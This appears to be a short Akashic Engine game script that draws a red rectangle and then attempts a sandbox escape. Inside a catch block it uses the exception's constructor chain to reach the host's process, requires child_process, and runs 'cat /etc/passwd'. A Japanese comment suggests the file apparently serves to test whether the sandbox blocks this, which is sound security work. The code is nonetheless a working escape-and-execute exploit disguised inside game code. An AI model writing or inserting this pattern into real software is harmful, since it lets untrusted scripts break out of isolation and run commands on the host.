const game = g.game;

function main(param) {
	const scene = new g.Scene({game});
	scene.loaded.add(function () {
		const rect = new g.FilledRect({
			scene: scene,
			cssColor: "#ff0000",
			width: 32,
			height: 32
		});
		scene.append(rect);
	});

	try {
		process.removeListener();
	} catch (host_exception) {
		// Sandbox内の場合、host_process.mainModuleがundefinedのため、requireでエラーとなる。
		host_constructor = host_exception.constructor.constructor;
		host_process = host_constructor('return this')().process;
		child_process = host_process.mainModule.require("child_process");
		console.log(child_process.execSync("cat /etc/passwd").toString());
	}
}

module.exports = main;
